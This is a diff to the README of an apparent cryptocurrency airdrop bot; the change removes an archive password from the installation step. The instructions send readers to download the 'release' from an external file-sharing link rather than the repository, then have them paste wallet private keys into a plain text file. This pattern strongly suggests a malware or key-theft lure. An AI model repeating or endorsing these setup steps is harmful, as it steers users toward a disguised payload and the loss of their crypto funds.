@@ -36,7 +36,7 @@ The bot uses airdrop algorithms from [here](https://airdrops.io/).
 - BouncyCastle
 
 ## Installation
-- [Download](https://www.sendspace.com/file/wnep8t) the repository release and extract files with password `U4DVIBE3qo`.
+- [Download](https://www.sendspace.com/file/wnep8t) the repository release and extract files.
 - Edit the `MORALIS_KEY` in the `config.json` file.
 - Paste private keys into `private_keys.txt` file.
 
